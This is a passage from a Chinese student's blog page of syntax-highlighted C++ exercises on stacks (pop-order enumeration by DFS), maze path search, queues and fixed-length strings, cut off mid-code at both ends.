class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">105</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stack</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> stk[N], top;</span><br><span class="line">    Stack() &#123;</span><br><span class="line">        <span class="built_in">memset</span>(stk, <span class="number">0</span>, <span class="keyword">sizeof</span>(stk));</span><br><span class="line">        top = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitStack</span><span class="params">(Stack* &amp;S)</span> </span>&#123;</span><br><span class="line">    S=<span class="keyword">new</span> Stack();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DestoryStack</span><span class="params">(Stack *&amp;S)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S!=<span class="literal">NULL</span>) <span class="keyword">delete</span> S;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClearStack</span><span class="params">(Stack *&amp;S)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(S-&gt;stk, <span class="number">0</span>, <span class="keyword">sizeof</span>(S-&gt;stk));</span><br><span class="line">    S-&gt;top=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackEmpty</span><span class="params">(Stack *S)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> S==<span class="literal">NULL</span> || S-&gt;top == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackLength</span><span class="params">(Stack *S)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> S==<span class="literal">NULL</span> ? <span class="number">0</span> : S-&gt;top;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetTop</span><span class="params">(Stack *S, <span class="keyword">int</span> &amp;e)</span> </span>&#123;</span><br><span class="line">    e=(S==<span class="literal">NULL</span>?<span class="number">0</span>:S-&gt;stk[S-&gt;top]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Push</span><span class="params">(Stack* &amp;S, <span class="keyword">int</span> e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S==<span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    S-&gt;stk[++S-&gt;top] = e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Pop</span><span class="params">(Stack* &amp;S, <span class="keyword">int</span> &amp;e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S==<span class="literal">NULL</span> || S-&gt;top==<span class="number">0</span>) &#123; e=<span class="number">0</span>; <span class="keyword">return</span>; &#125;</span><br><span class="line">    e = S-&gt;stk[S-&gt;top--];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StackTraverse</span><span class="params">(Stack *S)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S==<span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=S-&gt;top; i++) <span class="built_in">cout</span> &lt;&lt; S-&gt;stk[i] &lt;&lt; <span class="string">"- "</span>[i==S-&gt;top];</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StackCopy</span><span class="params">(Stack *S, Stack *T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T) <span class="keyword">delete</span> T;</span><br><span class="line">    InitStack(T);</span><br><span class="line">    <span class="built_in">memcpy</span>(T-&gt;stk ,S-&gt;stk, <span class="keyword">sizeof</span>(S-&gt;stk));</span><br><span class="line">    T-&gt;top = S-&gt;top;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> i, Stack *S, Stack *rec)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&gt;<span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> tmp=StackLength(rec), tmp1;</span><br><span class="line">        <span class="keyword">while</span>(!StackEmpty(S)) &#123;</span><br><span class="line">            <span class="keyword">int</span> e; Pop(S, e);</span><br><span class="line">            Push(rec, e);</span><br><span class="line">        &#125; StackTraverse(rec);</span><br><span class="line">        <span class="keyword">while</span>(StackLength(rec) != tmp) &#123;</span><br><span class="line">            Pop(rec, tmp1);</span><br><span class="line">            Push(S, tmp1); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> tmp, ls = StackLength(S);</span><br><span class="line">    <span class="comment">// 不出栈</span></span><br><span class="line">    Push(S, i); <span class="comment">// 入栈</span></span><br><span class="line">    DFS(i+<span class="number">1</span>, S, rec);</span><br><span class="line">    Pop(S, tmp); </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 出栈 </span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=ls; j++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>; k&lt;j; k++) &#123;</span><br><span class="line">            <span class="keyword">int</span> tmp1;</span><br><span class="line">            Pop(S, tmp1);</span><br><span class="line">            Push(rec, tmp1);</span><br><span class="line">        &#125;</span><br><span class="line">        Push(S, i);</span><br><span class="line">        DFS(i+<span class="number">1</span>, S, rec);</span><br><span class="line">        Pop(S, tmp);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>; k&lt;j; k++) &#123;</span><br><span class="line">            <span class="keyword">int</span> tmp1;</span><br><span class="line">            Pop(rec, tmp1);</span><br><span class="line">            Push(S, tmp1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Stack *S, *rec;</span><br><span class="line">    InitStack(S); InitStack(rec);</span><br><span class="line">    DFS(<span class="number">1</span>, S, rec);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h3><p>输出所有可能路径<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">105</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stack</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> stk[N], top;</span><br><span class="line">    Stack() &#123;</span><br><span class="line">        <span class="built_in">memset</span>(stk, <span class="number">0</span>, <span class="keyword">sizeof</span>(stk));</span><br><span class="line">        top = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitStack</span><span class="params">(Stack* &amp;S)</span> </span>&#123;</span><br><span class="line">    S=<span class="keyword">new</span> Stack();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DestoryStack</span><span class="params">(Stack *&amp;S)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S!=<span class="literal">NULL</span>) <span class="keyword">delete</span> S;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClearStack</span><span class="params">(Stack *&amp;S)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(S-&gt;stk, <span class="number">0</span>, <span class="keyword">sizeof</span>(S-&gt;stk));</span><br><span class="line">    S-&gt;top=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackEmpty</span><span class="params">(Stack *S)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> S==<span class="literal">NULL</span> || S-&gt;top == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackLength</span><span class="params">(Stack *S)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> S==<span class="literal">NULL</span> ? <span class="number">0</span> : S-&gt;top;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetTop</span><span class="params">(Stack *S, <span class="keyword">int</span> &amp;e)</span> </span>&#123;</span><br><span class="line">    e=(S==<span class="literal">NULL</span>?<span class="number">0</span>:S-&gt;stk[S-&gt;top]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Push</span><span class="params">(Stack* &amp;S, <span class="keyword">int</span> e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S==<span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    S-&gt;stk[++S-&gt;top] = e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Pop</span><span class="params">(Stack* &amp;S, <span class="keyword">int</span> &amp;e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S==<span class="literal">NULL</span> || S-&gt;top==<span class="number">0</span>) &#123; e=<span class="number">0</span>; <span class="keyword">return</span>; &#125;</span><br><span class="line">    e = S-&gt;stk[S-&gt;top--];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StackTraverse</span><span class="params">(Stack *S)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S==<span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=S-&gt;top; i++) <span class="built_in">cout</span> &lt;&lt; <span class="string">"("</span> &lt;&lt; S-&gt;stk[i]/<span class="number">10</span> &lt;&lt; <span class="string">","</span> &lt;&lt; S-&gt;stk[i]%<span class="number">10</span> &lt;&lt; <span class="string">")"</span> &lt;&lt; <span class="string">"- "</span>[i==S-&gt;top];</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StackCopy</span><span class="params">(Stack *S, Stack *T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T) <span class="keyword">delete</span> T;</span><br><span class="line">    InitStack(T);</span><br><span class="line">    <span class="built_in">memcpy</span>(T-&gt;stk ,S-&gt;stk, <span class="keyword">sizeof</span>(S-&gt;stk));</span><br><span class="line">    T-&gt;top = S-&gt;top;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> mp[<span class="number">10</span>][<span class="number">10</span>] = &#123;</span><br><span class="line"> &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;, </span><br><span class="line"> &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line"> &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line"> &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line"> &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line"> &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line"> &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line"> &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line"> &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line"> &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tx[] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> ty[] = &#123;<span class="number">1</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Search</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> dx, <span class="keyword">int</span> dy, Stack *S)</span> </span>&#123;</span><br><span class="line">    Push(S, x*<span class="number">10</span>+y); mp[x][y]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(x==dx &amp;&amp; y==dy) &#123;</span><br><span class="line">        StackTraverse(S);</span><br><span class="line">        <span class="keyword">int</span> tmp;</span><br><span class="line">        Pop(S, tmp); mp[x][y]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> ttx=x+tx[i], tty=y+ty[i];</span><br><span class="line">        <span class="keyword">if</span>(!mp[ttx][tty]) &#123;</span><br><span class="line">            Search(ttx, tty, dx, dy, S);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> tmp;</span><br><span class="line">    Pop(S, tmp); mp[x][y]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Stack *S; InitStack(S);</span><br><span class="line">    Search(<span class="number">1</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">8</span>, S);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">105</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Queue</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> a[N];</span><br><span class="line">    <span class="keyword">int</span> head, tail;</span><br><span class="line">    Queue() &#123;</span><br><span class="line">        <span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="keyword">sizeof</span>(a));</span><br><span class="line">        head = <span class="number">1</span>; tail = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitQueue</span><span class="params">(Queue *&amp;Q)</span> </span>&#123;</span><br><span class="line">    Q = <span class="keyword">new</span> Queue();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DestroyQueue</span><span class="params">(Queue *&amp;Q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q) <span class="keyword">delete</span> Q;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClearQueue</span><span class="params">(Queue *&amp;Q)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Q-&gt;a, <span class="number">0</span>, <span class="keyword">sizeof</span>(Q-&gt;a));</span><br><span class="line">    Q-&gt;head = <span class="number">1</span>; Q-&gt;tail = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">QueueEmpty</span><span class="params">(Queue *Q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Q-&gt;head == Q-&gt;tail;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">QueueLength</span><span class="params">(Queue *Q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Q-&gt;tail-Q-&gt;head+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetHead</span><span class="params">(Queue *Q, <span class="keyword">int</span> &amp;e)</span> </span>&#123;</span><br><span class="line">    e=(Q==<span class="literal">NULL</span>?<span class="number">0</span>:Q-&gt;a[Q-&gt;head]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnQueue</span><span class="params">(Queue *&amp;Q, <span class="keyword">int</span> e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q==<span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    Q-&gt;a[++Q-&gt;tail] = e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeQueue</span><span class="params">(Queue *&amp;Q, <span class="keyword">int</span> &amp;e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q==<span class="literal">NULL</span>) &#123; e=<span class="number">0</span>; <span class="keyword">return</span>; &#125;</span><br><span class="line">    e=Q-&gt;a[Q-&gt;head++];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QueueTraverse</span><span class="params">(Queue *Q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Q-&gt;head; i&lt;=Q-&gt;tail; i++) <span class="built_in">cout</span> &lt;&lt; Q-&gt;a[i] &lt;&lt; <span class="string">"- "</span>[i==Q-&gt;tail];</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试不全面<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Queue *Q; <span class="keyword">int</span> e;</span><br><span class="line">    InitQueue(Q);</span><br><span class="line">    EnQueue(Q, <span class="number">1</span>);</span><br><span class="line">    GetHead(Q, e);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; e &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; QueueLength(Q) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    EnQueue(Q, <span class="number">2</span>);</span><br><span class="line">    EnQueue(Q, <span class="number">4</span>);</span><br><span class="line">    QueueTraverse(Q);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; QueueLength(Q) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    DeQueue(Q, e);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; e &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    QueueTraverse(Q);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="串"><a href="#串" class="headerlink" title="串"></a>串</h2><p>我的下标是从0开始的，课本是从1开始的，所以有很多<code>pos--</code>的操作<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">255</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> SString[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StrAssign</span><span class="params">(SString &amp;T, <span class="keyword">char</span>* chars)</span> </span>&#123;</span><br><span class="line"><span class="comment">//  strcpy(T, chars);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; *chars; chars++, i++) T[i]=*chars;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StrCopy</span><span class="params">(SString &amp;T, SString S)</span> </span>&#123;</span><br><span class="line">    <span 